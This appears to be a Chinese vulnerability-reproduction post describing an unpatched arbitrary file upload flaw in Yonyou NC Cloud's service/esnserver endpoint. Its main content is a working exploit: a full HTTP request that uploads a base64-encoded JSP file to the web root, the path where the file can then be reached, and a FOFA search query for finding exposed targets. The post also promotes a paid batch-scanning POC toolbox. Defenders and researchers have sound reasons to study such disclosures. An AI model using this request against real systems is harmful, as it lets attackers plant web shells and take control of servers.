#  用友NC Cloud service/esnserver接口存在任意文件上传漏洞 附POC   
2024-11-5更新  南风漏洞复现文库   2024-11-05 22:47  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友NC Cloud 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
NC Cloud是用友推出的大型企业数字化平台。用友网络科技股份有限公司NC Cloud存在任意文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。用友NC Cloud service/esnserver接口存在任意文件上传漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DuwDwm8wU8BPGtYdiaOwzzdrGyKkRw9jI8zjlXTVydOm5El9XwD3d0XgQ/640?wx_fmt=png&from=appmsg "null")  
  
用友NC Cloud service/esnserver接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
app="用友-U8-Cloud"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/service/esnserver  
  
漏洞数据包：  
```
POST /service/esnserver HTTP/1.1
User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/129.0.0.0Safari/537.36
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded 
Token: 469ce01522f64366750d1995ca119841 
Content-Length: 579

{"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBAoAAAAAAA9tSFkDJCbXbQAAAG0AAAAKAAAAY29tcHJlc3NlZDwlIG91dC5wcmludGxuKCJEdWRlU3VpdGUiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT5QSwECHwAKAAAAAAAPbUhZAyQm120AAABtAAAACgAkAAAAAAAAACAAAAAAAAAAY29tcHJlc3NlZAoAIAAAAAAAAQAYACbiFZZEGdsBHOcblEgZ2wERXscDRxnbAVBLBQYAAAAAAQABAFwAAACVAAAAAAA=","p2":"webapps/u8c_web/A7788.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DupsCNcMmlEuAE4b9dnRuk0dG7ic822HaNibPSsG5jvkwibSfOt88nAz83g/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传的文件路径 http://xx.xx.xx.xx/A7788.jsp  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DuXPzHUVKMRJykswBZcYialhOEmD3iakWdFDlgY8lvz4m36w0pfjHBtKyg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
其中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DuuY7RlbhDPAvyCVPt9nFLbml5mcBzRQqnGyjjfaaLucQMlpgw9GicbAw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DuOgUtunDrhFHiaaFcZqxicyGpvsic0faXkPEjBl7eXr0mjPB2FCKcLk4xQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4Dua3XXHep6GsicdYxmbYlFEOMOu3Y8uZIKxicA5My7GNXMa2vbaCbCibWCg/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DuYcpibSZjYqiasaADKKsy5wztGRNgoLdSy0Yz6sj0n27oXXqOMyS3hCfw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DuLNaN5gOhPbvl8VrwhgLn34QvbkcHRicNmhuM8KiaXZNiaibL6ZeGibhwbmA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4DuCMzHOtq9icZWQicsMh1ibqe9jh33ZB58SXPicpfjSSxnWDTlcM6dMXnuQA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aEQfic2S9XickN6LpY8pb4Du3HPfFPadMdgibFSaQH7hl39k1Up5YdP08icXpwToRG1JAG4JibHnJLW6w/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新：https://www.yonyou.com/  
## 8.往期回顾  
  
  
[金华迪加现场大屏互动系统mobile.do.php接口存在任意文件上传漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487670&idx=1&sn=b20d4df66d776c16ddbeee3ba222d987&chksm=974b9db1a03c14a775738aacd4939d4dc743f2d5911a58bf5fa9db5d194bc2d6df0e66ba15ef&scene=21#wechat_redirect)  
  
  
[英飞达医学影像存档与通信系统WebUserLogin.asmx接口存在信息泄露漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487670&idx=2&sn=67f1dd6c4672c1c9c27a0d9a8fcb773f&chksm=974b9db1a03c14a74dc78aebabc3eec52c6c15f1948e79eb107ce23809873b5886d14db5876d&scene=21#wechat_redirect)  
  
  
